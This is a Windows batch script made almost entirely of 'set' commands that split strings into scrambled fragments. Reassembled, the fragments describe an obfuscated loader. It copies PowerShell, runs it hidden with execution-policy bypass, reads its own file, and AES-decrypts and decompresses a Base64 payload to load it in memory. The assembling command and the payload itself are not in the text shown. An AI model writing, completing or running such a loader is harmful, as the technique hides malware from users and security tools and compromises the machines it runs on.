@echo off
set "wxajPrDqxK=Sy"
set "VGAJrqXhvT=rs"
set "aOZcwLrVqA=we"
set "BAQfbbnhCi= /"
set "WTIvJFFVSH=he"
set "eqkocNURVz=Po"
set "kGkIDuyevi=1."
set "XtNAvNotSv=y "
set "AGvtDsVFLd=po"
set "qPpdyARWSJ=32"
set "ngAfOCnzwZ=we"
set "VQjVuntzui=do"
set "yTtshisDtV=ll"
set "JDErIgxxbN=co"
set "yxyXsYLNTu=py"
set "uBYmkHwlFC=s\"
set "yDUxiZmKwN=in"
set "yYAYdTgLbn=.e"
set "sBEUUtLVSo=ll"
set "LOsWpEkQfk=he"
set "XRgIbVOSBp=ow"
set "DuZsjMaVGV=nd"
set "txkpMcvNhB=em"
set "XXDJKMiFqt= C"
set "jpBrdhpLEh=Wi"
set "sxuQmLXfCS=\W"
set "LDIGwdDkOH=:\"
set "WsGPHPTQyY=0\"
set "cIDTJrjTqi=st"
set "AmaGQWctcb=ws"
set "ryLtsmCoHm=rS"
set "vOjSrmvcMS=xe"
set "IDXcJFERVQ=\v"
set "RCxHzNCYZe= %~dp0"
set "gAgslkdGKT=cd"
set "GZHxlgHeXZ=vMg."
set "hfyhfjyDsT=)))"
set "wsAVzyQUSc=Fina"
set "KsGQNHtLOH=gmkH"
set "TrmjIQlkNS=ress"
set "SJRWqilRPy=($VS"
set "LFQyrLBPqc=em.C"
set "GBApcZAiFG=CwI "
set "sIYeyaVlaO=[]] "
set "QdlUkzPCNE=HMCe"
set "zPdtkrSzIM=();$"
set "LzqligmqGo=ionM"
set "FpQMMCULOR=and "
set "QvjZZDkGeK=::('"
set "hlLPuCamwz=f.En"
set "mtpqSLVobu=;$BS"
set "nfKjUOAkES=Obje"
set "lBBrNVNQAo=.Key"
set "ECighbPTKP=sGUc"
set "hHkJDhLUwz=TMg."
set "MQuCHrJLKK=-nop"
set "HqqHBZHBuh=m.IO"
set "hgdNdyojXK=AHmp"
set "GnmyxrKEYX=.Con"
set "SDzPvqiKPy=0O+g"
set "NhDOvVkdzo=$GiB"
set "unZsyrfbke='')("
set "BZEOiqNFEX=EOJX"
set "dpmoAGQZhs=Gj ="
set "BTJMafHgut=VSle"
set "UynKajcpYV=TllA"
set "EFRkmorjJt=ct S"
set "FIkeTxjcxp=F'[-"
set "NCoGwPuwqA=Secu"
set "EEklZEexOi=New-"
set "ixcKWjLueF=mp.I"
set "ZYNhxGrvox=pStr"
set "qPjJcRLqNM=y]::"
set "rQKlREVTya=vert"
set "goWSVCwhya=wN ="
set "XeampCAySY=ptog"
set "einygODpqt=nirt"
set "NwfhJLgkYd=oL'["
set "vJowlebBiN=; };"
set "dpSnpywfaP=);$K"
set "GvuzyyvOAS=tsWi"
set "UMRhMvqySa=ach "
set "zDZNIkwgRZ=ress"
set "ZtpjEJtMuZ=hy.A"
set "eeCzFvPBmr=::De"
set "ZiKETVZkKg=nage"
set "EtuhuNAKpX=$GiB"
set "HdlhqFEsjt=esFX"
set "UUgdhnWCQL=b = "
set "waFIVQLNnX=oint"
set "GQPCPiJNMa=m(, "
set "HCJqPQGZoy=TwvM"
set "OPlHDyuIwk=ert]"
set "LoLXLsjOtO='[-1"
set "lIiMOYcafL=mkHb"
set "dTevoaCFTu= = $"
set "JjwnqdjpIH=New-"
set "wOXbLpyJru=morF"
set "zjzMBBfPRv=.Cop"
set "FSilKQQijM= if "
set "FNsTuviIhL=.Len"
set "uAFERzGXuI=b, 0"
set "ougAirqDVA=[Env"
set "RmZzkGyPCI=ke($"
set "PpCvocyBwp=hTMg"
set "dOuTTOGfQq==');"
set "GRMMNGWQFN=);$H"
set "GOJtYFLJXK=tem."
set "CADFbngiut=;$EO"
set "SRngVgOowk=736u"
set "RPGIdBjaUL=comp"
set "eUZIphQnFu=('l0"
set "WjmlbjnXkE=urit"
set "qkXrDfTMfm=ZTJG"
set "RYxJVzTDCn=-4] "
set "DToqllFmGT=Star"
set "WlLgLRbbxI= [Sy"
set "sGDSSHlPir=gmkH"
set "DFshDOBKVO=pher"
set "wGSIcOeCJk=CwI."
set "dfYrvzjlLu=eam("
set "NaCftwvEIZ=ptog"
set "fMYkGvPAZt=-ep "
set "lcnMTHdbkv=esaB"
set "GLyJGqetAC=Mode"
set "duSBsgsHNQ=lit("
set "oSWyhJEawW=;$ph"
set "RcEOyaMISJ= = N"
set "HdHzYwiZeh=e]::"
set "BybaWNHEAP=raph"
set "azldRMUFci=Comp"
set "dmakYGvbMQ=Conv"
set "UhPvIHvlyO=);$G"
set "fABODZIaHa=();$"
set "JWsNuFsdYL=ring"
set "JwQTRZMsUt=.-16"
set "CaYbXxUcgD=3HWs"
set "adGhPJnste=('da"
set "fQdaNhZAyS=]::N"
set "fPeoNDyxWR=[Sys"
set "yGDVEJdRxh=ect "
set "JeutJWMhBQ=Mg, "
set "azliXMmUmN=.Com"
set "RuegOmSaVF=yste"
set "MDtdfIKMbm=-1.."
set "LdiOPrGafs=grap"
set "ScaFVVMOcC=ZYYc"
set "FvAYPHJFpz=ZTJG"
set "uTIuRsHsHS=.Cre"
set "AxuYKWUejX=Disp"
set "imiVWwuGRM=();$"
set "BqyIMpvIPn=brea"
set "HiqFkgPssN=eC.D"
set "hxsRcKnKsg=OyzA"
set "CxvdGIfBKP=, $g"
set "kfAeXswyCK=Syst"
set "qLdoxKclcP=MCeC"
set "artvZtRnJo=UGTu"
set "dBhTfUIKyX= [st"
set "DpYJJxlJBL=mory"
set "UcHzntlqrY=ne);"
set "fHJakAtBJb=6] -"
set "VApZxDcNYU=sion"
set "YNBMKtFjMH=th('"
set "XJyZAsutvK=esMa"
set "KzVrlfyVYZ=$Twv"
set "prDurQDcQA=tS46"
set "PAnPVzSOIj='[-1"
set "HlxaXNUVqu=bstr"
set "ZlxUKQgLBN=g = "
set "EixcgcgHGf=ateD"
set "cgkWzfPoSC=form"
set "qeZKynMkQX=Hb ="
set "BnRoZqlTpn=$BSC"
set "fVvchkEgJm=pose"
set "yDAmCQDsSO=lBlo"
set "niQhwTvNGp=KAHm"
set "nItSDozuVG=$klR"
set "IvWVvbrWfL=t Sy"
set "oQnEoZrAoL=ss -"
set "IVooqPPwbD=PKCS"
set "IRsXcKcOmz=ay()"
set "DYkWSqRMAa=)) {"
set "BcgNmuQPgW=rofi"
set "zooPCFPXfB=:('g"
set "eGLwxkkwor=stem"
set "juCUfAKPbS=C = "
set "LrlVluASQr=ptor"
set "ZJJnLZdUVw=yTo("
set "uJdtnLtpkf=[Sys"
set "fyrCqiJTvH=gnir"
set "MGZEcrmIDn=ose("
set "WBBGGvgYeg=16] "
set "iLKzwkuxHq=rans"
set "ASlgCmqAOD=stem"
set "BhYkOGcQCx=$HMC"
set "zvVucmWtgm=S46e"
set "cvClODTbCh=onve"
set "Ebykidrmbb=.Mem"
set "WnFvtQJLqI=.Mod"
set "eVKEMnBeQh=);$K"
set "VmBPNvDYmU=]::("
set "lGwxnFXDAj= = ["
set "UpPQyhTHic= = $"
set "iXkOrAdvVs=Comp"
set "nMHlrMMOXJ=ing("
set "MbKUicauAP=ion."
set "eSzqmPPWeO=null"
set "JZpSEneShj=$GiB"
set "IRhgnuLxLc=6esa"
set "TDoSFOdVhR=comm"
set "gTuXbIKckL=$gmk"
set "BhELYiVUwy=ewLi"
set "VNmYkKmiMf=ck($"
set "lLQafUmLAO=k; }"
set "UCSxnzkMip=vj0m"
set "HRGiFCzUrC=] -j"
set "xxKnOfwgIa=+hAO"
set "NUpWVKfWut='dqR"
set "EyBlqWtniS=isfL"
set "ucKSSnGNQE=rity"
set "hxdzryjpjT=rtS4"
set "HsQEUROCoT=b = "
set "CgbGjSLAlg=).Sp"
set "azSbEdHNGN=]::C"
set "avcnQDyGKM=Disp"
set "TZBJfTFHEi=pose"
set "qQWnjOkecY=tem."
set "mcgeYPlczZ=7;$K"
set "dNxrKwEDmr=klRG"
set "auzTnOFHNp=ispo"
set "KBrJZxJDbg=n ''"
set "BLfaWdtTNq=[-1."
set "eoNdDRewTy=gth)"
set "SBXkrhjqHP=rity"
set "IzIxsfbwtv=rt]:"
set "oAAzhQkPZY=gmkH"
set "CgdHqIYmIt='gni"
set "ZMdDKYZvZz=oin "
set "PotavoYtDI= '')"
set "RzScBOboFz== [S"
set "EnGFVxxRRb=('%~f0'"
set "LJhRqZUyRs=;$Tw"
set "LJekNMrSQT=;$BS"
set "usOFqeJtaq=m.IO"
set "XZDVzCmfmq=Obje"
set "ojnHJNTiGi== $K"
set "MCNIYopgzQ=AHmp"
set "JLIFYtAFyw=ddin"
set "jfSMgwHPME=bypa"
set "YIMLBqHOKx=);$p"
set "QHajSXoYyb=$gmk"
